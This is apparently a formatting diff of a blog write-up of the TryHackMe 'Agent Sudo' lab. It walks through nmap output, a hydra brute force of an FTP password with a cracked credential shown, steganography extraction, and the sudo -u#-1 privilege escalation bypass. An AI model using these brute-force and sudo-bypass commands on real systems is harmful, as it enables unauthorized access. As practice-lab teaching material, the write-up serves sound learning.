@@ -8,9 +8,7 @@ categories:
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT      STATE    SERVICE REASON      VERSION
 21/tcp    open     ftp     syn-ack     vsftpd 3.0.3
 22/tcp    open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -33,7 +31,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 On the website :
 
-```
+```text
 Dear agents,
 
 Use your own codename as user-agent to access the site.
@@ -48,7 +46,7 @@ tried codename, sudo, agent R, R...
 
 and R gave us something
 
-```
+```text
 What are you doing! Are you one of the 25 employees? If not, I going to report this incident
 ```
 
@@ -58,9 +56,9 @@ A...B..C..is easy its like counting up to 3...sing a single melody...
 
 I giggled on agent P too
 
-only C and R have different content-lenght..and we cannot be R so...yeah
+only C and R have different content-length..and we cannot be R so...yeah
 
-```
+```text
 Attention chris,
 
 Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
@@ -75,7 +73,7 @@ seems like the bruteforce is strong in here
 
 We brutefore the ftp password with hydra
 
-```
+```bash
 $hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.185.167 ftp
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).
 
@@ -89,7 +87,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-04 17:21:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-04 17:22:58
 ```
 
-chris : crystal
+`chris : crystal`
 
 Next we grab all the stuff
 
@@ -97,7 +95,7 @@ Next we grab all the stuff
 
 we got `To_agentJ.txt`
 
-```
+```text
 Dear agent J,
 
 All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
@@ -108,14 +106,14 @@ Agent C
 
 and two images :
 
-<img src="cutie.png" alt="cutie" width=200 />
-<img src="cute-alien.jpg" alt="cutie" width=200 />
+{{< post-img src="cutie.png" alt="cutie" style="width:200px" >}}
+{{< post-img src="cute-alien.jpg" alt="cute-alien" style="width:200px" >}}
 
 Steganography it is
 
 first are those really pictures?
 
-```
+```bash
 $file \*
 
 cute-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3
@@ -124,21 +122,21 @@ cutie.png: PNG image data, 528 x 528, 8-bit colormap, non-interlaced
 
 There is no exif data...lets fire up `steghide`
 
-```
+```bash
 steghide --extract -sf cutie.png
 Entrez la passphrase:
 ```
 
 Cutie asks for a passphrase..it may be in cute-alien
 
-```
+```bash
 steghide --extract -sf cutie-alien.png
 Entrez la passphrase:
 ```
 
 actually no lets use `binwalk` then
 
-```
+```bash
 $binwalk cute-alien.jpg
 
 ## DECIMAL HEXADECIMAL DESCRIPTION
@@ -160,7 +158,7 @@ Ok cutie.png got a zip archive
 
 we extract it
 
-```
+```bash
 $binwalk cutie.png -e
 
 ## DECIMAL HEXADECIMAL DESCRIPTION
@@ -179,7 +177,7 @@ lets use zip2john then john with rockyou and the password is:
 
 Now we unzip the archive and read the text to agent R
 
-```
+```text
 Agent C,
 
 We need to send the picture to 'QXJlYTUx' as soon as possible!
@@ -194,7 +192,7 @@ This team have communication issues (even for secret agents)
 
 we use that final password to extract stuff from the second image with steghide
 
-```
+```bash
 steghide info cute-alien.jpg
 "cute-alien.jpg":
 format: jpeg
@@ -220,7 +218,7 @@ And we get the user flag
 
 in the same folder there is ANOTHER PICTURE dammit! I think we might need that
 
-```
+```bash
 $scp james@10.10.252.51:Alien_autospy.jpg /home/nair0lf32
 james@10.10.252.51's password:
 Alien_autospy.jpg
@@ -228,7 +226,7 @@ Alien_autospy.jpg
 
 That one alien is not cute at all
 
-<img src="Alien_autospy.jpg" alt="cutie" width=200 />
+{{< post-img src="Alien_autospy.jpg" alt="alien autopsy" style="width:200px" >}}
 
 haha autospy (nice)
 
@@ -240,9 +238,9 @@ Time to PrivEsc
 
 \*_mission impossible theme starts_
 
-## Priviledge Escalation
+## Privilege Escalation
 
-```
+```bash
 sudo -l
 [sudo] password for james:
 Matching Defaults entries for james on agent-sudo:
@@ -260,7 +258,7 @@ Read it..understand it...do it
 
 `sudo -u#-1 /bin/bash`
 
-```
+```text
 To Mr.hacker,
 
 Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.
@@ -273,7 +271,5 @@ DesKel a.k.a Agent R
 ```
 
 Cool..there is a bonus for agent R identity..lets GO...
-
 kek I am stupid, its just...`deskel`
-
 That was a fun one
